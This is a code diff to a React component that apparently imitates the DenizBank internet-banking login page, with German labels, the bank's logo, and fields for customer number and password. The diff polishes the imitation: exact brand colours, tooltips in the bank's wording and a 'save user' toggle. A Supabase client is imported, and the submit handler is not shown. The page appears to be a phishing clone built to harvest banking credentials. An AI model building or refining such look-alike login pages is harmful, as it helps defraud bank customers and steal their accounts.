@@ -4,6 +4,7 @@ import { ChevronDown, ChevronRight } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
+import { HoverCard, HoverCardTrigger, HoverCardContent } from "@/components/ui/hover-card";
 
 import logo from "@/assets/denizbank-logo.svg";
 import bg from "@/assets/denizbank-bg.jpg";
@@ -29,7 +30,7 @@ const Denizbank = () => {
   const [passwort, setPasswort] = useState("");
   const [lang, setLang] = useState<"DE" | "EN" | "TR">("DE");
   const [activeTab, setActiveTab] = useState<"privat" | "gemein" | "firma">("privat");
-  const [saveUser, setSaveUser] = useState(true);
+  const [saveUser, setSaveUser] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
   usePageMeta("DenizBank - Internetbanking", denizIcon);
@@ -58,7 +59,23 @@ const Denizbank = () => {
   ];
 
   const InfoBadge = () => (
-    <span className="inline-flex h-5 w-5 items-center justify-center rounded-full border border-[#0073b0] text-[#0073b0] text-[11px] font-bold leading-none">i</span>
+    <span className="inline-flex h-5 w-5 items-center justify-center rounded-full border border-[#0073b0] text-[#0073b0] text-[11px] font-bold leading-none cursor-help">i</span>
+  );
+
+  const MaskIcon = ({ src }: { src: string }) => (
+    <span
+      className="h-4 w-4 bg-current inline-block"
+      style={{
+        WebkitMaskImage: `url(${src})`,
+        maskImage: `url(${src})`,
+        WebkitMaskRepeat: "no-repeat",
+        maskRepeat: "no-repeat",
+        WebkitMaskPosition: "center",
+        maskPosition: "center",
+        WebkitMaskSize: "contain",
+        maskSize: "contain",
+      }}
+    />
   );
 
   return (
@@ -123,18 +140,24 @@ const Denizbank = () => {
                   {(["privat", "gemein", "firma"] as const).map((t) => {
                     const label = t === "privat" ? "Privat" : t === "gemein" ? "Gemeinschaft" : "Firma";
                     const active = activeTab === t;
+                    const isPrivat = t === "privat";
                     return (
                       <button
                         key={t}
-                        onClick={() => setActiveTab(t)}
+                        onClick={isPrivat ? () => setActiveTab(t) : undefined}
+                        disabled={!isPrivat}
                         className={`flex items-center justify-between px-5 py-4 ${
                           active
-                            ? "bg-white text-[#e6007e] font-semibold rounded-t-md"
-                            : "bg-white/10 backdrop-blur-md text-white/90"
+                            ? "bg-white rounded-t-md text-[#1874ca] font-semibold text-base"
+                            : "bg-white/10 backdrop-blur-md text-white/90 cursor-default"
                         }`}
                       >
                         <span>{label}</span>
-                        {active ? <ChevronDown className="h-4 w-4" /> : <ChevronRight className="h-4 w-4" />}
+                        {active ? (
+                          <ChevronDown className="h-4 w-4 text-[#1874ca]" />
+                        ) : (
+                          <ChevronRight className="h-4 w-4" />
+                        )}
                       </button>
                     );
                   })}
@@ -144,17 +167,24 @@ const Denizbank = () => {
                 {/* Card */}
                 <div className="bg-white rounded-b-md p-6 space-y-4 shadow-2xl">
                   <div className="flex items-center justify-between text-sm">
-                    <label className="text-gray-800 font-medium">Login (Kundennummer)</label>
+                    <label className="text-[#555] font-semibold">Login (Kundennummer)</label>
                     <div className="flex items-center gap-2">
                       <span className="text-xs text-gray-600">Benutzer speichern</span>
                       <button
                         onClick={() => setSaveUser((s) => !s)}
-                        className={`relative inline-flex h-5 w-9 items-center rounded-full transition ${saveUser ? "bg-[#e6007e]" : "bg-gray-300"}`}
+                        className={`relative inline-flex h-5 w-9 items-center rounded-full border transition ${saveUser ? "bg-[#1874ca] border-[#1874ca]" : "bg-white border-gray-300"}`}
                         aria-pressed={saveUser}
                       >
-                        <span className={`inline-block h-4 w-4 rounded-full bg-white transition ${saveUser ? "translate-x-4" : "translate-x-0.5"}`} />
+                        <span className={`inline-block h-4 w-4 rounded-full transition ${saveUser ? "bg-white translate-x-[18px]" : "bg-[#1874ca] translate-x-0.5"}`} />
                       </button>
-                      <InfoBadge />
+                      <HoverCard openDelay={100} closeDelay={100}>
+                        <HoverCardTrigger asChild>
+                          <span><InfoBadge /></span>
+                        </HoverCardTrigger>
+                        <HoverCardContent side="bottom" align="end" className="bg-[#555] text-white border-none text-xs leading-relaxed w-72">
+                          Wenn Sie diese Checkbox aktivieren, werden die Kundennummer und Ihr Name bei der nächsten Anmeldung auf diesem Browser angezeigt. Eine Authentifizierung ist aus Sicherheitsgründen weiterhin erforderlich. Sie können die gespeicherten Anmeldedaten jederzeit wieder löschen.
+                        </HoverCardContent>
+                      </HoverCard>
                     </div>
                   </div>
 
@@ -164,35 +194,44 @@ const Denizbank = () => {
                       value={kundennummer}
                       onChange={(e) => setKundennummer(e.target.value)}
                       placeholder="Kundennummer eingeben"
-                      className="h-12 w-full rounded border border-gray-300 px-3 pr-10 text-sm focus:border-[#0073b0] focus:outline-none placeholder:text-gray-500"
+                      className="h-12 w-full rounded border border-gray-300 px-3 pr-10 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                     />
-                    <span className="absolute right-3 top-1/2 -translate-y-1/2"><InfoBadge /></span>
+                    <span className="absolute right-3 top-1/2 -translate-y-1/2">
+                      <HoverCard openDelay={100} closeDelay={100}>
+                        <HoverCardTrigger asChild>
+                          <span><InfoBadge /></span>
+                        </HoverCardTrigger>
+                        <HoverCardContent side="top" align="end" className="bg-[#555] text-white border-none text-xs leading-relaxed w-72">
+                          Ihre Kundennummer finden Sie auf Ihrer Bankkarte.
+                        </HoverCardContent>
+                      </HoverCard>
+                    </span>
                   </div>
 
-                  <label className="block text-sm text-gray-800 font-medium pt-1">Passwort</label>
+                  <label className="block text-sm text-[#555] font-semibold pt-1">Passwort</label>
                   <input
                     type="password"
                     value={passwort}
                     onChange={(e) => setPasswort(e.target.value)}
                     placeholder="Passwort eingeben"
-                    className="h-12 w-full rounded border border-gray-300 px-3 text-sm focus:border-[#0073b0] focus:outline-none placeholder:text-gray-500"
+                    className="h-12 w-full rounded border border-gray-300 px-3 text-sm hover:border-[#1874ca] focus:border-[#e7041f] focus:outline-none placeholder:text-[#555]"
                   />
 
                   <button
                     onClick={handleSubmit}
-                    className="w-full h-12 rounded text-white font-bold tracking-widest uppercase text-sm hover:opacity-90 transition"
-                    style={{ background: "linear-gradient(90deg, #e30613 0%, #e6007e 100%)" }}
+                    className="w-full h-12 rounded text-white font-extrabold tracking-widest uppercase text-sm hover:opacity-90 transition"
+                    style={{ background: "linear-gradient(90deg, #e70317 0%, #c20086 100%)" }}
                   >
                     Weiter
                   </button>
 
                   <div className="grid grid-cols-2 gap-3 pt-1">
-                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-sm text-gray-700 hover:bg-gray-50">
-                      <img src={sperreIcon} alt="" className="h-4 w-4" />
+                    <button className="group flex items-center justify-center gap-2 h-11 rounded border border-[#555] text-sm text-[#555] hover:border-[#e7041f] hover:text-[#e7041f] transition-colors">
+                      <MaskIcon src={sperreIcon} />
                       Sperre aufheben
                     </button>
-                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-sm text-gray-700 hover:bg-gray-50">
-                      <img src={passwortVergessenIcon} alt="" className="h-4 w-4" />
+                    <button className="group flex items-center justify-center gap-2 h-11 rounded border border-[#555] text-sm text-[#555] hover:border-[#1874ca] hover:text-[#1874ca] transition-colors">
+                      <MaskIcon src={passwortVergessenIcon} />
                       Passwort vergessen
                     </button>
                   </div>
